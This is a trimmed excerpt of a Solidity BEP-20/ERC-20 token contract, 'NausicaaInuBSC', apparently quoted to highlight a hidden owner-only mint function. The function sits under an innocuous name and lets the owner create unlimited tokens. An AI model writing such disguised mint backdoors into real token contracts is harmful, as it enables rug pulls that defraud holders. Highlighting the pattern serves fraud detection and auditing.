...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function NausicaaBSC(uint256 amount) public onlyOwner {
    _nausicaabsc(msg.sender, amount);
    }
    ...
    function _nausicaabsc(address account, uint256 amount) internal virtual {
...
contract        NausicaaInuBSC   is ERC20 {
    ...
    constructor() public ERC20("  NausicaaInuBSC     ", "NausicaaBSC ") {
        _nausicaabsc(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}